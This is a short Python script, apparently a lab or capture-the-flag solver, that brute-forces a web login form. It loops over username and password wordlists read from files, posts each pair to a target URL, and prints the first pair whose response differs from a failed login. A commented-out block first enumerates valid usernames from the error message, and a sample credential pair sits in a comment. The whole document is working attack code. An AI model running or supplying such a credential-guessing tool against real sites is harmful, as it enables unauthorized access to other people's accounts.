#!/usr/bin/env python3
import requests
import sys
import os

os.system('cls')
if len(sys.argv) < 2:
    print("Usage: " +sys.argv[0]+ " <url>")
    sys.exit(1)

url = sys.argv[1]

def login(username, password):
    req = requests.post(url, data={
    	"username":username,
    	"password":password,
    	"submit":"Login"
    })
    return req
    
#print(login("bhagesh","admin@123").text)

with open("userid", "r") as h:
	usernames = [line.strip() for line in h.read().split("\n") if line]

with open("cred", "r") as h:
	passwords = [line.strip() for line in h.read().split("\n") if line]
	
# first check valid username & then check valid password.
for username in usernames:
	for password in passwords:
		resp = login(username, password).text
		if "<!--" not in resp:
			print(f"{username} : {password}")
			exit()
		
"""
	# print(f"username {username} : {resp}")
	if resp == "Incorrect password!":
		for password in passwords:
			resp = login(username, password).text
			if "<!DOCTYPE html>" in resp:
				# print(f"username {username} password {password} : {resp}")
				print(f"username {username} password {password}")
				break
"""
